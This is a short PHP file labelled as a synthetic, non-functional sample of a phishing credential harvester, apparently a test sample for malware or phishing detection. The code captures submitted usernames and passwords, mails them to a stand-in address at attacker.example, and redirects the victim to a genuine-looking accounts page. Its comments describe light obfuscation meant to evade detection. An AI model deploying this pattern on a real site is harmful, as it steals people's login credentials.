<?php
// Synthetic sample - phishing credential harvester (NON-FUNCTIONAL, fake recipient)
// Family: credential capture -> external exfil
// (obfuscated: spaced brackets + a request superglobal instead of the bare POST literal)
$user = $_REQUEST[ 'username' ];
$pass = $_REQUEST[ 'password' ];
$body = "u: $user / p: $pass";
mail("collector@attacker.example", "creds", $body);
header("Location: https://accounts.example.com/");
?>
